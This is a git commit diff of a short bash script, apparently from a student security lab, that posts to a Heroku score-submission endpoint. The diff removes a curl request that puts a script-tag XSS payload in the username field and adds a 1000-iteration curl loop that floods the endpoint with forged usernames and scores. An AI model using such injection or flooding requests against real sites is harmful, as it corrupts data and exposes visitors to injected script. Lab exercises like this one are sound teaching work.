e267f21d61ef8a12e7af429174922d6965de7b1b
Hayden Wolff <haydenwolff99@gmail.com>
2018-12-06 01:35:43 -0500

    did required parts, just doing extra

--- security/overload.sh
+++ security/overload.sh
@@ -1,9 +1,8 @@
 #!/bin/bash
 
-for ((i=1; i<=2; i++))
+for ((i=1; i<=1000; i++))
 	do
-		echo "HI"
-		curl --data "username=<script>window.open('http://gph.is/2d4jD6G')</script>&score=1800&grid={}" https://lab8-11-7-18.herokuapp.com/submit
+		curl --data "username=hacked!&score=6670&grid={}" https://lab8-11-7-18.herokuapp.com/submit
 	done
 echo "done"
 
